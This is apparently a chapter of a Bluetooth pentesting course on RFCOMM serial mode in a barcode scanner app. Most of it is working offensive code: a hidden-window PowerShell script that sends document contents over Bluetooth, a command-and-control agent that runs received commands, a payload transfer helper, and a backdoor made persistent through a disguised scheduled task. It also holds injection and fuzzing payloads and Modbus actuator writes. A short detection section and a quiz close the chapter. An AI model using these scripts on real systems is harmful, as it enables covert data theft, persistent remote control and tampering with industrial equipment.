# RFCOMM Mode for Advanced Testing

## Overview

RFCOMM (Radio Frequency Communication) is an alternative Bluetooth profile that emulates serial port connections. The HID Barcode Scanner app supports RFCOMM mode, providing unique capabilities for security testing that differ from HID keyboard emulation.

## Table of Contents

1. [Understanding RFCOMM](#understanding-rfcomm)
2. [RFCOMM vs HID: Security Implications](#rfcomm-vs-hid-security-implications)
3. [Setting Up RFCOMM Testing](#setting-up-rfcomm-testing)
4. [Advanced RFCOMM Techniques](#advanced-rfcomm-techniques)
5. [Custom Protocol Testing](#custom-protocol-testing)
6. [RFCOMM in Red Team Operations](#rfcomm-in-red-team-operations)

## Understanding RFCOMM

### What is RFCOMM?

RFCOMM (defined in Bluetooth specification RFCOMM with TS 07.10) provides:
- Serial port emulation over Bluetooth
- Bidirectional communication
- Stream-based data transfer
- Multiple simultaneous connections (up to 30 channels)

**Key Characteristics**:
- **Protocol**: Serial Port Profile (SPP)
- **UUID**: `00001101-0000-1000-8000-00805F9B34FB`
- **Data Format**: Raw byte streams (any encoding)
- **Connection**: Persistent connection required
- **Baud Rate**: Not applicable (Bluetooth handles data rate)

### Protocol Stack

```
┌────────────────────────────┐
│   Application Data         │
├────────────────────────────┤
│   RFCOMM Layer             │ ← Serial port emulation
├────────────────────────────┤
│   L2CAP                    │ ← Packet assembly
├────────────────────────────┤
│   Link Manager / Baseband  │
├────────────────────────────┤
│   Bluetooth Radio          │
└────────────────────────────┘
```

### How HID Scanner Uses RFCOMM

When configured in RFCOMM mode, HID Barcode Scanner:
1. Advertises SPP service (UUID 00001101)
2. Accepts incoming connections OR initiates connections
3. Sends scanned barcode data as raw text over serial stream
4. Can receive data back from host

**Configuration Steps**:
1. Open HID Barcode Scanner
2. Go to Settings
3. Connection Mode → Select "RFCOMM (SPP)"
4. Restart app for changes to take effect

## RFCOMM vs HID: Security Implications

### Comparison Matrix

| Aspect | HID Mode | RFCOMM Mode |
|--------|----------|-------------|
| **Visibility** | High (types on screen) | Low (background) |
| **Detection** | Visible keystrokes | Silent data transfer |
| **OS Integration** | Automatic (trusted) | Requires application |
| **Speed** | Keyboard input speed | Full bandwidth |
| **Data Type** | Keystrokes only | Any binary data |
| **Authorization** | Trusted by default | Application-specific |
| **Logging** | May log keystrokes | Application-dependent |
| **User Awareness** | User sees typing | User unaware |
| **Common Uses** | Keyboards, mice | Wireless serial, barcode scanners |

### Security Trade-offs

**HID Advantages for Attackers**:
- ✅ No software required on target
- ✅ Works immediately
- ✅ OS trusts input
- ✅ Can execute GUI commands

**HID Disadvantages**:
- ❌ Visible to user
- ❌ Limited to keyboard input
- ❌ Detected by HID-monitoring tools

**RFCOMM Advantages for Attackers**:
- ✅ Silent operation
- ✅ Full-bandwidth data transfer
- ✅ Bidirectional communication
- ✅ Can transfer binary data
- ✅ Less monitored than HID

**RFCOMM Disadvantages**:
- ❌ Requires software on target
- ❌ Not trusted by default
- ❌ COM port must be accessed

### When to Use RFCOMM for Testing

**Scenarios Favoring RFCOMM**:

1. **Testing Application Security**
   - Application reads from serial port
   - Testing input validation
   - Protocol fuzzing
   - Command injection in serial applications

2. **Covert Operations**
   - Need to avoid user detection
   - Long-duration data exfiltration
   - Persistent backdoor
   - Automated data collection

3. **High-Bandwidth Operations**
   - Large data transfer
   - Binary file transfer
   - Continuous monitoring
   - Real-time data streaming

4. **Custom Protocol Testing**
   - Industrial control systems
   - Embedded devices
   - POS systems
   - Barcode scanner applications

## Setting Up RFCOMM Testing

### Windows Configuration

**1. Verify COM Port Creation**

After pairing HID Scanner in RFCOMM mode:

```powershell
# List Bluetooth COM ports
Get-WmiObject -Query "SELECT * FROM Win32_SerialPort WHERE Description LIKE '%Bluetooth%'"

# Alternative method
[System.IO.Ports.SerialPort]::GetPortNames()

# Device Manager check
devmgmt.msc
# Navigate to: Ports (COM & LPT)
# Look for: "Standard Serial over Bluetooth link (COMx)"
```

**2. Test Connection with PowerShell**

```powershell
# Basic serial communication test
$port = New-Object System.IO.Ports.SerialPort
$port.PortName = "COM3"  # Replace with your COM port
$port.BaudRate = 9600    # Arbitrary for Bluetooth SPP
$port.Open()

# Read data
while ($true) {
    if ($port.BytesToRead -gt 0) {
        $data = $port.ReadLine()
        Write-Host "Received: $data"
    }
    Start-Sleep -Milliseconds 100
}

$port.Close()
```

**3. Send Data to HID Scanner**

```powershell
$port = New-Object System.IO.Ports.SerialPort
$port.PortName = "COM3"
$port.BaudRate = 9600
$port.Open()

# Send data
$port.WriteLine("Test message from PC")

$port.Close()
```

### Linux Configuration

**1. Identify RFCOMM Device**

```bash
# After pairing, check Bluetooth serial devices
ls -l /dev/rfcomm*

# Or look for Bluetooth serial in /dev
ls -l /dev | grep -i bluetooth

# May need to bind RFCOMM
sudo rfcomm bind /dev/rfcomm0 <MAC_ADDRESS> 1
```

**2. Test with Screen**

```bash
# Connect to RFCOMM device
screen /dev/rfcomm0 9600

# Type to send data
# Ctrl+A, K to exit
```

**3. Python Serial Communication**

```python
import serial
import time

# Connect to RFCOMM device
ser = serial.Serial('/dev/rfcomm0', 9600, timeout=1)

try:
    while True:
        # Read data
        if ser.in_waiting > 0:
            data = ser.readline().decode('utf-8').strip()
            print(f"Received: {data}")
        
        # Send data
        ser.write(b"Test from Linux\\n")
        time.sleep(1)

except KeyboardInterrupt:
    print("Exiting...")
finally:
    ser.close()
```

### macOS Configuration

**1. Discover Bluetooth Serial Device**

```bash
# List available serial devices
ls -l /dev/cu.*

# Should see something like:
# /dev/cu.HIDBarcodeScannerRFCOMM
```

**2. Test Connection**

```bash
# Using screen
screen /dev/cu.HIDBarcodeScannerRFCOMM 9600

# Or cat
cat /dev/cu.HIDBarcodeScannerRFCOMM

# Send data
echo "Test" > /dev/cu.HIDBarcodeScannerRFCOMM
```

## Advanced RFCOMM Techniques

### Technique 1: Silent Data Exfiltration

**Objective**: Exfiltrate data without user detection

**Setup on Target (PowerShell)**:

```powershell
# Silent RFCOMM data exfiltration script
# Save as: rfcomm_exfil.ps1

param(
    [string]$ComPort = "COM3",
    [string]$DataPath = "C:\\Users\\*\\Documents"
)

# Hide PowerShell window
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) # 0 = hide

try {
    $port = New-Object System.IO.Ports.SerialPort
    $port.PortName = $ComPort
    $port.BaudRate = 9600
    $port.Open()
    
    Write-Host "[*] RFCOMM Exfiltration Started"
    
    # Find sensitive files
    $files = Get-ChildItem -Path $DataPath -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        $port.WriteLine("[FILE] $($file.FullName)")
        
        # Read file content (for text files)
        if ($file.Extension -in @('.txt', '.log', '.csv')) {
            $content = Get-Content -Path $file.FullName -Raw
            $port.WriteLine($content)
            $port.WriteLine("[END]")
        }
        
        Start-Sleep -Milliseconds 500
    }
    
    $port.WriteLine("[COMPLETE]")
    $port.Close()
    
} catch {
    # Silent failure
}
```

**Receiving on Android (HID Scanner)**:

The app will receive file listings via RFCOMM. In a real attack:
1. Data is received by HID Scanner
2. Can be logged or forwarded
3. Attacker retrieves Android device later
4. Or forwarded to another service

### Technique 2: RFCOMM Command & Control

**Objective**: Use RFCOMM for C2 communication

**Target Agent (PowerShell)**:

```powershell
# RFCOMM C2 Agent
# Receives commands via RFCOMM, executes, returns output

param([string]$ComPort = "COM3")

$port = New-Object System.IO.Ports.SerialPort
$port.PortName = $ComPort
$port.BaudRate = 9600
$port.ReadTimeout = 500
$port.Open()

Write-Host "[*] RFCOMM C2 Agent Active"

while ($true) {
    try {
        # Read command
        $command = $port.ReadLine().Trim()
        
        if ($command -eq "exit") {
            break
        }
        
        # Execute command
        $output = Invoke-Expression $command 2>&1 | Out-String
        
        # Send output back
        $port.WriteLine("--- OUTPUT START ---")
        $port.WriteLine($output)
        $port.WriteLine("--- OUTPUT END ---")
        
    } catch [System.TimeoutException] {
        # No data, continue waiting
        Start-Sleep -Milliseconds 100
    } catch {
        $port.WriteLine("ERROR: $($_.Exception.Message)")
    }
}

$port.Close()
```

**Attacker Control (Python on Android via Termux or PC)**:

```python
import serial
import time

class RFCOMMController:
    def __init__(self, port):
        self.ser = serial.Serial(port, 9600, timeout=1)
    
    def send_command(self, command):
        """Send command to target"""
        print(f"[→] Sending: {command}")
        self.ser.write(f"{command}\\n".encode())
        
        # Wait for response
        time.sleep(0.5)
        output = []
        
        while self.ser.in_waiting > 0:
            line = self.ser.readline().decode('utf-8', errors='ignore').strip()
            if line == "--- OUTPUT END ---":
                break
            if line != "--- OUTPUT START ---":
                output.append(line)
        
        return '\\n'.join(output)
    
    def interactive_shell(self):
        """Interactive command shell"""
        print("[*] RFCOMM C2 Interactive Shell")
        print("[*] Type 'exit' to quit\\n")
        
        while True:
            try:
                command = input("rfcomm> ")
                
                if command.lower() == 'exit':
                    self.ser.write(b"exit\\n")
                    break
                
                if not command:
                    continue
                
                output = self.send_command(command)
                print(output)
                print()
                
            except KeyboardInterrupt:
                print("\\n[*] Exiting...")
                break
    
    def close(self):
        self.ser.close()

# Usage
controller = RFCOMMController('/dev/rfcomm0')  # or COM3 on Windows
controller.interactive_shell()
controller.close()
```

### Technique 3: Binary Data Transfer

**Objective**: Transfer binary files (executables, images, etc.)

**Python Example**:

```python
import serial
import base64
import os

def send_file_over_rfcomm(serial_port, file_path):
    """Send binary file via RFCOMM"""
    
    ser = serial.Serial(serial_port, 115200, timeout=1)  # Higher baud (ignored for BT but good practice)
    
    file_name = os.path.basename(file_path)
    file_size = os.path.getsize(file_path)
    
    # Send file metadata
    ser.write(f"FILE_START:{file_name}:{file_size}\\n".encode())
    
    # Read file and encode
    with open(file_path, 'rb') as f:
        file_data = f.read()
    
    # Base64 encode for safe transmission
    encoded_data = base64.b64encode(file_data)
    
    # Send in chunks
    chunk_size = 1024
    for i in range(0, len(encoded_data), chunk_size):
        chunk = encoded_data[i:i+chunk_size]
        ser.write(chunk)
        ser.write(b'\\n')
        print(f"[→] Sent {i}/{len(encoded_data)} bytes")
    
    ser.write(b"FILE_END\\n")
    print(f"[✓] File sent: {file_name}")
    
    ser.close()

def receive_file_over_rfcomm(serial_port, output_dir='.'):
    """Receive binary file via RFCOMM"""
    
    ser = serial.Serial(serial_port, 115200, timeout=1)
    
    print("[*] Waiting for file...")
    
    # Wait for file start
    while True:
        line = ser.readline().decode('utf-8', errors='ignore').strip()
        if line.startswith("FILE_START:"):
            parts = line.split(':')
            file_name = parts[1]
            file_size = int(parts[2])
            print(f"[*] Receiving: {file_name} ({file_size} bytes)")
            break
    
    # Receive data
    received_data = b""
    while True:
        line = ser.readline()
        if line.strip() == b"FILE_END":
            break
        received_data += line.strip()
    
    # Decode and save
    file_data = base64.b64decode(received_data)
    output_path = os.path.join(output_dir, file_name)
    
    with open(output_path, 'wb') as f:
        f.write(file_data)
    
    print(f"[✓] File saved: {output_path}")
    
    ser.close()

# Usage examples
# Send malware/tool to target
# send_file_over_rfcomm('COM3', 'payload.exe')

# Receive exfiltrated data
# receive_file_over_rfcomm('COM3', './exfiltrated/')
```

### Technique 4: Protocol Fuzzing

**Objective**: Fuzz applications that read from serial ports

```python
import serial
import random
import time

class RFCOMMFuzzer:
    def __init__(self, port):
        self.ser = serial.Serial(port, 9600, timeout=1)
        self.crash_cases = []
    
    def fuzz_random(self, iterations=1000):
        """Send random data to fuzz target"""
        print(f"[*] Fuzzing with random data ({iterations} iterations)...")
        
        for i in range(iterations):
            # Generate random payload
            length = random.randint(1, 1024)
            payload = bytes([random.randint(0, 255) for _ in range(length)])
            
            try:
                self.ser.write(payload)
                self.ser.write(b'\\n')
                print(f"[{i}/{iterations}] Sent {len(payload)} bytes", end='\\r')
                
                # Check for response (or lack thereof = crash?)
                time.sleep(0.1)
                
            except Exception as e:
                print(f"\\n[!] Exception at iteration {i}: {e}")
                self.crash_cases.append({
                    'iteration': i,
                    'payload': payload.hex(),
                    'error': str(e)
                })
        
        print(f"\\n[+] Fuzzing complete. {len(self.crash_cases)} potential crashes")
    
    def fuzz_format_strings(self):
        """Test format string vulnerabilities"""
        print("[*] Fuzzing with format strings...")
        
        payloads = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%p%p%p%p%p%p%p%p%p%p",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "AAAA%08x.%08x.%08x.%08x",
            "%s" * 100,
            "%p" * 100,
        ]
        
        for payload in payloads:
            print(f"[→] Testing: {payload[:50]}...")
            self.ser.write(payload.encode())
            self.ser.write(b'\\n')
            time.sleep(0.5)
    
    def fuzz_overflow(self):
        """Test buffer overflow vulnerabilities"""
        print("[*] Fuzzing with oversized payloads...")
        
        sizes = [10, 100, 256, 512, 1024, 2048, 4096, 8192, 16384]
        
        for size in sizes:
            print(f"[→] Sending {size} bytes...")
            payload = b"A" * size
            self.ser.write(payload)
            self.ser.write(b'\\n')
            time.sleep(1)
    
    def report_crashes(self):
        """Report potential crashes"""
        if self.crash_cases:
            print("\\n=== Potential Crash Cases ===")
            for case in self.crash_cases:
                print(f"\\nIteration: {case['iteration']}")
                print(f"Payload: {case['payload'][:100]}...")
                print(f"Error: {case['error']}")
    
    def close(self):
        self.ser.close()

# Usage
fuzzer = RFCOMMFuzzer('/dev/rfcomm0')
fuzzer.fuzz_random(100)
fuzzer.fuzz_format_strings()
fuzzer.fuzz_overflow()
fuzzer.report_crashes()
fuzzer.close()
```

## Custom Protocol Testing

### Testing Barcode Scanner Applications

Many applications expect barcode scanners to connect via serial/COM ports. Testing these:

**1. Identify Expected Protocol**

```python
# Monitor what application expects to receive
import serial

ser = serial.Serial('COM3', 9600)

print("[*] Monitoring application's serial communication...")
print("[*] Trigger normal barcode scan and observe\\n")

while True:
    if ser.in_waiting > 0:
        data = ser.read(ser.in_waiting)
        print(f"[←] Received: {data}")
        print(f"    Hex: {data.hex()}")
        print(f"    ASCII: {data.decode('ascii', errors='ignore')}")
        print()
```

**2. Inject Malicious Barcodes**

```python
# Send specially crafted "barcode" data
import serial

ser = serial.Serial('COM3', 9600)

# Test cases
test_cases = [
    "12345",  # Normal barcode
    "A" * 1000,  # Overflow test
    "'; DROP TABLE products; --",  # SQL injection
    "../../../etc/passwd",  # Path traversal
    "<script>alert('XSS')</script>",  # XSS (if displayed in web UI)
    "%s%s%s%s%s",  # Format string
    "\\x00\\x01\\x02",  # Binary/control characters
]

for i, test in enumerate(test_cases):
    print(f"[Test {i+1}] Sending: {test[:50]}...")
    ser.write(test.encode('utf-8', errors='ignore'))
    ser.write(b'\\n')
    
    # Wait and check response
    time.sleep(1)
    if ser.in_waiting > 0:
        response = ser.read(ser.in_waiting)
        print(f"Response: {response}")

ser.close()
```

### Testing Industrial Control Systems

**Caution**: Only test authorized ICS/SCADA systems in isolated environments.

```python
# Example: Testing Modbus-like protocol over RFCOMM
import serial
import struct

def send_modbus_command(ser, unit_id, function, address, value):
    """
    Simplified Modbus command structure
    Real Modbus has CRC and more complexity
    """
    command = struct.pack('>BBHH', unit_id, function, address, value)
    ser.write(command)
    
    # Read response
    time.sleep(0.5)
    if ser.in_waiting > 0:
        response = ser.read(ser.in_waiting)
        return response
    return None

# Test various function codes
ser = serial.Serial('/dev/rfcomm0', 9600)

# Function 1: Read coils
response = send_modbus_command(ser, unit_id=1, function=1, address=0, value=10)

# Function 5: Write single coil (control actuator)
response = send_modbus_command(ser, unit_id=1, function=5, address=0, value=0xFF00)

ser.close()
```

## RFCOMM in Red Team Operations

### Persistence via RFCOMM Backdoor

**Objective**: Establish persistent RFCOMM-based backdoor

**PowerShell Persistence Script**:

```powershell
# RFCOMM Backdoor with Persistence
# Establishes RFCOMM listener that survives reboots

param(
    [string]$ComPort = "COM3",
    [string]$TaskName = "BluetoothService"
)

# Create backdoor script
$backdoorPath = "$env:APPDATA\\Microsoft\\Windows\\Bluetooth\\bt_service.ps1"
$backdoorContent = @'
$port = New-Object System.IO.Ports.SerialPort
$port.PortName = "COM3"
$port.BaudRate = 9600
$port.ReadTimeout = 500
$port.Open()

while ($true) {
    try {
        $cmd = $port.ReadLine().Trim()
        if ($cmd) {
            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $port.WriteLine($output)
        }
    } catch {
        Start-Sleep -Milliseconds 100
    }
}
'@

# Ensure directory exists
New-Item -ItemType Directory -Force -Path (Split-Path $backdoorPath) | Out-Null

# Write backdoor
$backdoorContent | Out-File -FilePath $backdoorPath -Force

# Create scheduled task for persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backdoorPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

Write-Host "[+] RFCOMM backdoor installed"
Write-Host "[+] Persistence: Scheduled Task '$TaskName'"
Write-Host "[+] Backdoor script: $backdoorPath"
```

**Defense Detection**:

```powershell
# Detect RFCOMM-based backdoors

# 1. Check for suspicious scheduled tasks
Get-ScheduledTask | Where-Object {$_.Actions.Execute -like "*powershell*"} | 
    Select-Object TaskName, State, @{Name="Command";Expression={$_.Actions.Arguments}}

# 2. Check for processes accessing COM ports
Get-Process | ForEach-Object {
    $proc = $_
    $handles = (Get-Process -Id $proc.Id).Modules | Where-Object {$_.ModuleName -like "*serial*"}
    if ($handles) {
        Write-Host "Process accessing serial: $($proc.Name) (PID: $($proc.Id))"
    }
}

# 3. Monitor serial port activity
# (Requires specific monitoring tool or driver-level monitoring)
```

## Best Practices

### For Red Team

1. **Pre-stage Software**: Deploy COM port reader before RFCOMM attack
2. **Use Encryption**: Encrypt RFCOMM traffic (application-level)
3. **Rate Limiting**: Avoid overwhelming serial buffer
4. **Error Handling**: Handle disconnections gracefully
5. **Clean Up**: Remove persistence mechanisms at engagement end

### For Blue Team

1. **Monitor COM Ports**: Log all serial port access
2. **Application Whitelisting**: Restrict what can access COM ports
3. **Network Segmentation**: Limit which systems have Bluetooth
4. **Disable RFCOMM**: If not needed, disable SPP profile
5. **Audit Bluetooth Devices**: Regularly review paired devices

## Quiz

1. What is the UUID for Bluetooth SPP (RFCOMM)?
2. How does RFCOMM differ from HID in terms of detection?
3. What are three advantages of RFCOMM for covert operations?
4. How can you identify the COM port created by an RFCOMM connection?
5. What types of attacks are suited for RFCOMM vs. HID?
6. How can you use RFCOMM for command and control?
7. What defensive measures can detect RFCOMM backdoors?
8. What is a primary disadvantage of RFCOMM compared to HID?

## Next Steps

- [BLE Access Control Systems →](06-ble-access-control.md)
- [Exercise 3: Access Control Testing →](exercises/ex03-access-control-testing.md)

## Resources

- [Bluetooth RFCOMM Specification](https://www.bluetooth.com/specifications/specs/)
- [Serial Port Communication Guides](https://docs.microsoft.com/en-us/dotnet/api/system.io.ports.serialport)
- [RFCOMM Security Research](https://scholar.google.com/scholar?q=bluetooth+rfcomm+security)

---

[← Back: HID Scanner Pentesting](04-hid-scanner-pentesting.md) | [Next: BLE Access Control →](06-ble-access-control.md)
